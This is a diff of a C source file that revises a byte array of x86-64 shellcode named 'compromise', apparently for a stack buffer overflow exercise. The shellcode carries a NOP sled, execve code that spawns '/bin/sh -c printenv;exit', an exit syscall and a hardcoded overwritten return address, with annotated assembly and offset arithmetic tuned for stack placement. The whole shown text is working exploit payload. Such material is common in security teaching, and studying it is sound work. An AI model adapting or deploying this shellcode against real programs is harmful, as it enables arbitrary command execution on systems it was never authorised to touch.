@@ -16,73 +16,65 @@ int main(int argc, char * argv[]){
 }
 
 // Variable to contain hex bytes of shell code
-char compromise[161] = {
-                                             //  bits 64
-     //8 ; two nop matching size in selfcomp.c
-     //16
-     0x90,0x90,0x90,//24
-     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
-     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//32
-     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//40
-    //-4
+char compromise[159] = {
+    0x90,0x90,0x90,0x90,0x90,          //padding
                                             //   bits 64
                                              //       ; find out where we are
-    0xEB, 0x62,                    		    //42 start:     jmp short codeEnd
-    0x5E,                     				//43 start2:    pop rsi
+    0xEB, 0x62,                    		    //2 start:     jmp short codeEnd
+    0x5E,                     				//3 start2:    pop rsi
                                             //            ; clear the a register
-    0x48,0x31,0xC0,              			//44           mov rax,0x0
+    0x48,0x31,0xC0,              			//6         mov rax,0x0
                                             //            ; restore null bytes to data
-    0x88, 0x46, 0x07,                  	    //47           mov [byte rsi+flagStr-exeStr-2],al
-    0x88, 0x46, 0x0B,                  	    //50           mov [byte rsi+cmdStr-exeStr-1],al
-    0x88, 0x46, 0x19,                  	    //53           mov [byte rsi+arrayAddr-exeStr-1],al
-    0x48, 0x89, 0x46, 0x32,                 //57           mov [byte rsi+arrayAddr-exeStr+24],rax
+    0x88, 0x46, 0x07,                  	    //9         mov [byte rsi+flagStr-exeStr-2],al
+    0x88, 0x46, 0x0B,                  	    //12         mov [byte rsi+cmdStr-exeStr-1],al
+    0x88, 0x46, 0x19,                  	    //15         mov [byte rsi+arrayAddr-exeStr-1],al
+    0x48, 0x89, 0x46, 0x32,                 //19         mov [byte rsi+arrayAddr-exeStr+24],rax
                                             //           
                                             //            ; restore argv
                                             //            
-    0x48, 0x89, 0x76, 0x1A,                 //61           mov [byte rsi + arrayAddr - exeStr],rsi
-    0x48, 0x8D, 0x7E, 0x09,                 //65           lea rdi,[byte rsi + flagStr - exeStr] 
-    0x48, 0x89, 0x7E, 0x22,                 //69           mov [byte rsi + arrayAddr - exeStr + 8],rdi
-    0x48, 0x8D, 0x7E, 0x0C,                 //73           lea rdi, [byte rsi + cmdStr - exeStr]
-    0x48, 0x89, 0x7E, 0x2A,                 //77           mov [byte rsi + arrayAddr - exeStr + 16],rdi
+    0x48, 0x89, 0x76, 0x1A,                 //23        mov [byte rsi + arrayAddr - exeStr],rsi
+    0x48, 0x8D, 0x7E, 0x09,                 //27          lea rdi,[byte rsi + flagStr - exeStr] 
+    0x48, 0x89, 0x7E, 0x22,                 //31          mov [byte rsi + arrayAddr - exeStr + 8],rdi
+    0x48, 0x8D, 0x7E, 0x0C,                 //35           lea rdi, [byte rsi + cmdStr - exeStr]
+    0x48, 0x89, 0x7E, 0x2A,                 //39         mov [byte rsi + arrayAddr - exeStr + 16],rdi
     
                                             //            ; execve system call
-    0xB0, 0x3B,                 			//79           mov al,0x3b
-    0x48, 0xBF,                 		  	//81           mov rdi,rsi
-        
-    0x48, 0xBE,                   			//83           mov rsi,arrayAddr
-        
-    0x48, 0x89, 0xE2,                  	    //86           mov rdx,rsp
-    0x48, 0xC1, 0xEA, 0x20,                 //90           shr rdx,32
-    0x48, 0xC1, 0xE2, 0x20,                 //94           shl rdx,32
-    0xB9, 0xFF, 0x56, 0xFB, 0xF7,                 //98    
-                                   		    //102           mov ecx,0xf7fb56ff
-    0x80,0xF1,0xFF,                         //              xor cl,0xff                                         
-    0x48, 0x09, 0xCA,                   	//105           or  rdx,rcx
-    0x48, 0x8D, 0x3A,                   	//108           lea rdi,[rdx]
-    0x0F, 0x05,                    		    //110           syscall
+    0xB0, 0x3B,                 			//41          mov al,0x3b
+    0x48, 0xBF,                 		  	//43         mov rdi,rsi
+    //488D771A    
+    0x48, 0x8D,0x77,0x1A,                   //47         lea rsi,[byte rdi + arrayAddr - exeStr]
+    0x48, 0x89, 0xE2,                  	    //48          mov rdx,rsp
+    0x48, 0xC1, 0xEA, 0x20,                 //52          shr rdx,32
+    0x48, 0xC1, 0xE2, 0x20,                 //56          shl rdx,32
+    0xB9, 0xFF, 0x56, 0xFB, 0xF7,           //61   
+                                   		    //           mov ecx,0xf7fb56ff
+    0x80,0xF1,0xFF,                         //64              xor cl,0xff                                         
+    0x48, 0x09, 0xCA,                   	//67           or  rdx,rcx
+    0x48, 0x8D, 0x3A,                   	//70           lea rdi,[rdx]
+    0x0F, 0x05,                    		    //72           syscall
                                             //
                                             //            ; exit system call
-    0x48, 0x89, 0xC7,                   	//113           mov rdi,rax
-    0x48, 0x31, 0xC0,                   	//116           xor rax,rax
-    0xB0, 0x3C,                    		    //118           mov al,0x3c
-    0x0F, 0x05,                    		    //120           syscall
+    0x48, 0x89, 0xC7,                   	//75           mov rdi,rax
+    0x48, 0x31, 0xC0,                   	//78          xor rax,rax
+    0xB0, 0x3C,                    		    //80          mov al,0x3c
+    0x0F, 0x05,                    		    //82          syscall
                                             //
-    0xE8, 0xAB, 0xFF, 0xFF, 0xFF,           //125codeEnd:   call start2
+    0xE8, 0xAB, 0xFF, 0xFF, 0xFF,           //87      codeEnd:   call start2
                                             //            ; data
-    0x2F, 0x62, 0x69, 0x6E, 0x2F,           //130
-    0x73, 0x68, 0x58, 0x79,      			//134 exeStr:    db "/bin/shXy"
-    0x2D, 0x63, 0x58,                  	    //137 flagStr:   db "-cX"
-    0x70, 0x72, 0x69, 0x6E, 0x74,           //142
-    0x65, 0x6E, 0x76, 0x3B,     			//146 cmdStr:    db "printenv;exitX"
-    0x65, 0x78, 0x69, 0x74, 0x58,           //151
-    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//155 arrayAddr: dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//159           dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//162           dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//166           dq 0xffffffffffffffff
+    0x2F, 0x62, 0x69, 0x6E, 0x2F,           //92
+    0x73, 0x68, 0x58, 0x79,      			//96     exeStr:    db "/bin/shXy"
+    0x2D, 0x63, 0x58,                  	    //99     flagStr:   db "-cX"
+    0x70, 0x72, 0x69, 0x6E, 0x74,           //104
+    0x65, 0x6E, 0x76, 0x3B,     			//108    cmdStr:    db "printenv;exitX"
+    0x65, 0x78, 0x69, 0x74, 0x58,           //113
+    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//121 arrayAddr: dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//129          dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//137          dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//145         dq 0xffffffffffffffff
                                         	//newAddr:   dd newAddr-start
      // ret addy
-     0xff,0xff,0xff,0xff,0xff,0x7f,0x00,    //173
-    //rsp = 0x7fffffffdb98 - 0x98 0x93 = 0x7fffffffdb1b
+     0xff,0xda,0xff,0xff,0xff,0x7f,0x00,    //154
+    //rsp = 0x7fffffffdb98 - 154 +1 = 0x7fffffffdaff
 };
 
 // string variable to probe the stack and find the correct
